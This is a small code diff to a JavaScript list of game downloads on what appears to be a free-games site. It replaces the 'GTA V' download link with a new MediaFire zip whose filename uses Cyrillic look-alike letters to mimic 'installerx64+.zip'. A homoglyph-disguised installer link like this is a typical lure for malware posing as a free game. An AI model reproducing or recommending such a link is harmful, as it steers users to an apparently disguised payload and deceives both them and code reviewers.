@@ -128,7 +128,7 @@ export const ItemsList = [
         title: "GTA V",
         downloadCount: "87.3K",
         src: "/icons/gta-5.png",
-        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
+        downloadLink: "https://download1081.mediafire.com/p1ijk9s1bgig/mek0fu1z0gy9uj7/%D1%96nstaller%D1%8564+.zip"
       },
       {
         title: "Rust",
